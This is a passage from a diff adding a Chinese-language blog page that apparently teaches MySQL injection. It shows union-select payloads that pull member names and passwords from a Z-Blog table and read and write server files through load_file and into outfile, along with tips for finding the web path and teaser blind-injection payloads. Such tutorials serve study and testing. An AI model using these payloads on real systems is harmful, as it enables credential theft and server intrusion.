class="number">3</span>,mem_Name,mem_Password,<span class="number">6</span> <span class="keyword">from</span> zblog.zbp_member</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="文件读写"><a href="#文件读写" class="headerlink" title="文件读写"></a>文件读写</h2><p><strong>前提条件：</strong></p>
+<ol>
+<li>当前数据库用户有 FILE 权限</li>
+<li><code>secure_file_priv</code> 设置允许</li>
+</ol>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 读文件</span></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,load_file(<span class="string">&#x27;d:\\1.txt&#x27;</span>),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 写文件（将数据写入服务器）</span></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="string">&#x27;hello&#x27;</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span> <span class="keyword">into</span> outfile <span class="string">&#x27;d:\\2.txt&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>路径获取思路：</strong></p>
+<ol>
+<li>报错显示获取路径</li>
+<li>phpinfo 页面泄漏</li>
+<li>利用常见中间件、数据库默认安装路径</li>
+</ol>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://yh8567.github.io">江小白</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://yh8567.github.io/2026/05/17/mysql-injection-basics/">https://yh8567.github.io/2026/05/17/mysql-injection-basics/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://yh8567.github.io" target="_blank">江小白</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a><a class="post-meta__tags" href="/tags/MySQL/">MySQL</a><a class="post-meta__tags" href="/tags/Union%E6%9F%A5%E8%AF%A2/">Union查询</a><a class="post-meta__tags" href="/tags/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99/">文件读写</a><a class="post-meta__tags" href="/tags/%E8%B7%A8%E5%BA%93%E6%9F%A5%E8%AF%A2/">跨库查询</a></div><div class="post-share"><div class="social-share" data-image="/img/avatar.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2026/05/17/sql-blind-injection/" title="SQL盲注技术 — 布尔、时间、报错注入与CMS实战"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">SQL盲注技术 — 布尔、时间、报错注入与CMS实战</div></div><div class="info-2"><div class="info-item-1">什么是盲注当注入获取的数据不能回显到前端页面时，我们需要用特殊方法判断和尝试，这就是盲注。 三类盲注：    类型 依赖条件 常用函数    布尔盲注 页面有输出判断标准 length, left, substr, ascii, ord   时间盲注 完全无回显 if, sleep   报错盲注 有报错容错处理 updatexml, extractvalue, floor    布尔盲注基本思路： 爆库名长度 → 逐位猜库名 → 爆表数量 → 爆表名长度 → 逐位猜表名 → 爆列数量 → 爆列名 → 爆数据 12345678-- 爆数据库长度id=1 and length(database())=7-- 逐位猜解数据库名id=1 and left(database(),1)=&#x27;p&#x27;id=1 and substr(database(),2,1)=&#x27;i&#x27;id=1 and ord(left(database(),1))=112id=1 and ascii(substr(database(),1,1))=112  爆表数量： 1id=1 and (...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2026/05/17/sql-blind-injection/" title="SQL盲注技术 — 布尔、时间、报错注入与CMS实战"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-17</div><div class="info-item-2">SQL盲注技术 — 布尔、时间、报错注入与CMS实战</div></div><div class="info-2"><div class="info-item-1">什么是盲注当注入获取的数据不能回显到前端页面时，我们需要用特殊方法判断和尝试，这就是盲注。 三类盲注：    类型 依赖条件 常用函数    布尔盲注 页面有输出判断标准 length, left, substr, ascii, ord   时间盲注 完全无回显 if, sleep   报错盲注 有报错容错处理 updatexml, extractvalue, floor    布尔盲注基本思路： 爆库名长度 → 逐位猜库名 → 爆表数量 → 爆表名长度 → 逐位猜表名 → 爆列数量 → 爆列名 → 爆数据 12345678-- 爆数据库长度id=1 and length(database())=7-- 逐位猜解数据库名id=1 and left(database(),1)=&#x27;p&#x27;id=1 and substr(database(),2,1)=&#x27;i&#x27;id=1 and ord(left(database(),1))=112id=1 and ascii(substr(database(),1,1))=112  爆表数量： 1id=1 and (...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">江小白</div><div class="author-info-description">信息安全 | 渗透测试 | 技术分享</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">2</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/yh8567"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/yh8567" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">路漫漫其修远兮，吾将上下而求索</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP-MySQL-Web-%E7%BB%84%E6%88%90%E6%9E%B6%E6%9E%84"><span class="toc-number">1.</span> <span class="toc-text">PHP-MySQL-Web 组成架构</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%9F%E4%B8%80-root-%E7%94%A8%E6%88%B7%E7%AE%A1%E7%90%86"><span class="toc-number">1.1.</span> <span class="toc-text">统一 root 用户管理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E5%AF%B9%E4%B8%80%E7%94%A8%E6%88%B7%E7%AE%A1%E7%90%86%EF%BC%88%E6%8E%A8%E8%8D%90%EF%BC%89"><span class="toc-number">1.2.</span> <span class="toc-text">一对一用户管理（推荐）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-%E6%B3%A8%E5%85%A5%E6%AD%A5%E9%AA%A4"><span class="toc-number">2.</span> <span class="toc-text">SQL 注入步骤</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%EF%BC%9A%E6%95%B0%E5%AD%97%E5%9E%8B%E8%BF%98%E6%98%AF%E5%AD%97%E7%AC%A6%E5%9E%8B"><span class="toc-number">2.1.</span> <span class="toc-text">1. 判断注入类型：数字型还是字符型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E7%8C%9C%E8%A7%A3%E5%AD%97%E6%AE%B5%E6%95%B0"><span class="toc-number">2.2.</span> <span class="toc-text">2. 猜解字段数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BF%A1%E6%81%AF"><span class="toc-number">2.3.</span> <span class="toc-text">3. 获取当前数据库信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">2.4.</span> <span class="toc-text"></span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E7%9A%84%E8%A1%A8"><span class="toc-number">2.5.</span> <span class="toc-text">4. 获取数据库中的表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E8%8E%B7%E5%8F%96%E8%A1%A8%E4%B8%AD%E7%9A%84%E5%AD%97%E6%AE%B5%E5%90%8D"><span class="toc-number">2.6.</span> <span class="toc-text">5. 获取表中的字段名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE"><span class="toc-number">2.7.</span> <span class="toc-text">6. 获取数据</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E5%87%BD%E6%95%B0"><span class="toc-number">3.</span> <span class="toc-text">常用信息获取函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B7%A8%E5%BA%93%E6%9F%A5%E8%AF%A2"><span class="toc-number">4.</span> <span class="toc-text">跨库查询</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99"><span class="toc-number">5.</span> <span class="toc-text">文件读写</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/17/sql-blind-injection/" title="SQL盲注技术 — 布尔、时间、报错注入与CMS实战">SQL盲注技术 — 布尔、时间、报错注入与CMS实战</a><time datetime="2026-05-17T05:00:00.000Z" title="发表于 2026-05-17 13:00:00">2026-05-17</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/17/mysql-injection-basics/" title="SQL注入基础 — MySQL注入入门到文件读写">SQL注入基础 — MySQL注入入门到文件读写</a><time datetime="2026-05-17T04:00:00.000Z" title="发表于 2026-05-17 12:00:00">2026-05-17</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By 江小白</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.1</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.5-b1</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.5-b1"></script><script src="/js/main.js?v=5.5.5-b1"></script><div class="js-pjax"></div><script>
+(() => {
+  const html = document.documentElement
+  const dayBgs = ['/img/白天图.png', '/img/白天图2.png']
+  const nightBgs = ['/img/夜晚图.png', '/img/夜晚图2.png']
+  function pick(arr) { return arr[Math.floor(Math.random() * arr.length)] }
+
+  const saved = localStorage.getItem('theme') || 'dark'
+  html.setAttribute('data-theme', saved)
+  document.body.style.background = 'url(' + pick(saved === 'dark' ? nightBgs : dayBgs) + ') center center / cover no-repeat fixed'
+
+  const toggleBtn = document.querySelector('.nav-site-title')
+  if (toggleBtn) {
+    toggleBtn.addEventListener('click', (e) => {
+      e.preventDefault()
+      const cur = html.getAttribute('data-theme')
+      const next = cur === 'dark' ? 'light' : 'dark'
+      html.setAttribute('data-theme', next)
+      localStorage.setItem('theme', next)
+      document.body.style.background = 'url(' + pick(next === 'dark' ? nightBgs : dayBgs) + ') center center / cover no-repeat fixed'
+    })
+  }
+
+  const immersiveBtn = document.createElement('a')
+  immersiveBtn.id = 'immersive-btn'
+  immersiveBtn.title = '沉浸模式 — 隐藏页面元素，只看背景'
+  immersiveBtn.innerHTML = '<div class="mini-cat"><div class="mini-body"></div></div>'
+  document.body.appendChild(immersiveBtn)
+  immersiveBtn.addEventListener('click', () => {
+    document.body.classList.toggle('immersive')
+    immersiveBtn.style.opacity = document.body.classList.contains('immersive') ? '0.5' : '1'
+  })
+})()
+</script>
+<script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
